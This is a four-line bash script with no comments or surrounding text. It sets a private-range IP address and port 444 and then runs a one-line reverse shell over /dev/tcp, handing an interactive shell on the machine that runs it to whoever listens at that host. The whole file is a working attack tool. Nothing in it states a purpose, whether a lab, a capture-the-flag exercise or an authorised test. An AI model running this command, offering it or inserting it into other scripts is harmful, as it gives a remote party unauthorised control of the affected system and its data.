#!/bin/bash
ip=10.236.100.227
port=444
bash &> /dev/tcp/$ip/$port 0>&1
